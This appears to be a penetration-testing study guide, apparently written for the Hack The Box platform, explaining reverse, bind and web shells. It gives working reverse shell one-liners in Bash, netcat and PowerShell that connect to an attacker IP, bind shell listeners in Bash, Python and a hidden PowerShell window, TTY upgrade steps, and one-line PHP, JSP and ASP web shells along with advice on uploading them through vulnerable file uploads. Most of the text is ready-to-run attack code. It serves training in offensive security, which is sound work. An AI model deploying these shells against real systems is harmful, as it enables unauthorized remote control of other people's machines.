Once we `compromise` a `system` and `exploit` a `vulnerability` to `execute commands` on the `compromised hosts` `remotely`, we usually need a method of `communicating` with the `system` so we don't have to keep `exploiting` the same `vulnerability` to `execute` each `command`. To `enumerate` the `system` or take further control over it or within its `network`, we need a `reliable connection` that gives us direct access to the `system's shell`, i.e., `Bash` or `PowerShell`, so we can thoroughly investigate the `remote system` for our next move. One way to connect to a `compromised system` is through `network protocols`, like `SSH` for `Linux` or `WinRM` for `Windows`, which would allow us a `remote login` to the `compromised system`. However, unless we obtain a working set of `login credentials`, we would not be able to utilize these `methods` without `executing commands` on the `remote system` first, to gain access to these `services` in the first place. The other method of accessing a `compromised host` for control and `remote code execution` is through `shells`. As previously discussed, there are three main types of `shells`: `Reverse Shell`, `Bind Shell`, and `Web Shell`. Each of these `shells` has a different method of `communication` with us for accepting and `executing` our `commands`.

|  Type of Shell  |                                                   Method of Communication                                                   |
| :-------------: | :-------------------------------------------------------------------------------------------------------------------------: |
| `Reverse Shell` |                       Connects back to our system and gives us control through a reverse connection.                        |
|  `Bind Shell`   |                               Waits for us to connect to it and gives us control once we do.                                |
|   `Web Shell`   | Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output. |

## Reverse Shell

A `Reverse Shell` is the most common type of `shell`, as it is the quickest and easiest method to obtain control over a `compromised host`. Once we identify a `vulnerability` on the `remote host` that allows `remote code execution`, we can start a `netcat` `listener` on our machine that listens on a specific `port` (for example, `port 1234`). With this `listener` in place, we can execute a `reverse shell command` that connects the `remote system's` `shell` (i.e., `Bash` or `PowerShell`) to our `netcat listener`, giving us a `reverse connection` from the `remote system` back to our machine.

#### Netcat Listener

```bash
OathBornX@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
```

The flags we are using are the following:

|   Flag    |                                     Description                                     |
| :-------: | :---------------------------------------------------------------------------------: |
|   `-l`    |               Listen mode, to wait for a connection to connect to us.               |
|   `-v`    |             Verbose mode, so that we know when we receive a connection.             |
|   `-n`    |  Disable DNS resolution and only connect from/to IPs, to speed up the connection.   |
| `-p 1234` | Port number `netcat` is listening on, and the reverse connection should be sent to. |
#### Connect Back IP

However, first, we need to find our system's `IP` to send a `reverse connection` back to us. We can find our `IP` with the following command:

```bash
OathBornX@htb[/htb]$ ip a

...SNIP...

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none
    inet 10.10.10.10/23 scope global tun0
...SNIP...
```

#### Reverse Shell Commands

The `command` we execute depends on what `operating system` the `compromised host` runs on, i.e., `Linux` or `Windows`, and what `applications` and `commands` we can access. The `Payload All The Things` page has a comprehensive list of `reverse shell commands` we can use that cover a wide range of options depending on our `compromised host`.

Certain `reverse shell commands` are more reliable than others and can usually be attempted to get a `reverse connection`. The below `commands` are reliable `commands` we can use to get a `reverse connection`, for `Bash` on `Linux` `compromised hosts` and `PowerShell` on `Windows` `compromised hosts`:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

We can utilize the `exploit` we have on the `remote host` to `execute` one of the above `commands`, i.e., through a `Python exploit` or a `Metasploit module`, to get a `reverse connection`. Once we do, we should receive a `connection` in our `netcat listener` (`netcat`), giving us interactive access to the `compromised host`

```bash
OathBornX@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

# Bind Shell

A `Bind Shell` is another type of `shell`. Unlike a `Reverse Shell` that connects back to us, a `Bind Shell` requires us to connect to the target's `listening port`.

Once we execute a `Bind Shell Command`, the remote host will start `listening` on a `port` and `bind` that host's `shell` (`Bash` or `PowerShell`) to that port. We then connect to that port with `netcat` and gain `control` of the `compromised host` through an interactive `shell` session.

The following are reliable commands we can use to start a bind shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

#### Netcat Connection

Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it.

We can use `netcat` to connect to that port and get a connection to the shell:

```bash
OathBornX@htb[/htb]$ nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

# Upgrading TTY

Here’s the classic one-liner you use inside your `netcat shell` to upgrade into a full interactive `TTY`. It uses `Python` (or `Python3` depending on what’s available on the target):

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:

```bash
www-data@remotehost$ ^Z

OathBornX@htb[/htb]$ stty raw -echo
OathBornX@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```

At this point, we would have a fully working `TTY shell` with `command history` and normal interactivity.

However, we may notice that the `shell` does not cover the entire `terminal` window. To fix this, we need to configure the `rows` and `columns` of the `terminal` environment variables.

We do this by opening another `terminal` window on our own system, maximizing it (or setting it to whatever size we want), and running the following `commands` to get the values:

```bash
echo $TERM
stty size
```

```bash
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```

---

# Web Shell

The final type of `shell` is a `Web Shell`. A `Web Shell` is typically a `web script` (for example, `PHP` or `ASPX`) that accepts our `commands` through `HTTP request parameters` such as `GET` or `POST`. The `Web Shell` then `executes` our `command` on the `remote host` and prints the `output` back on the `web page`.

#### Writing a Web Shell

First, we need to create a `Web Shell` that accepts our `command` via a `GET request`, executes it, and prints the `output` back to the `web page`.

A `Web Shell script` is typically a one-liner, short enough to memorize and quick to deploy. Here are some common one-liner `Web Shells` for widely used `web languages`:

```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

#### Uploading a Web Shell

Once we have a `web shell`, we need to place it inside the server’s `webroot` (the directory where the web server serves files). This lets us execute the script by accessing it through a browser.

Common method: exploit a vulnerable `file upload` feature to upload a shell script such as `shell.php`.

| Web Server |    Default Webroot     |
| :--------: | :--------------------: |
|  `Apache`  |     /var/www/html/     |
|  `Nginx`   | /usr/local/nginx/html/ |
|   `IIS`    |  c:\inetpub\wwwroot\   |
|  `XAMPP`   |    C:\xampp\htdocs\    |

#### Accessing Web Shell

Once we write our web shell, we can either access it through a browser or by using `cURL`. We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:

```http
http://SERVER_IP:PORT/shell.php?cmd=id
```
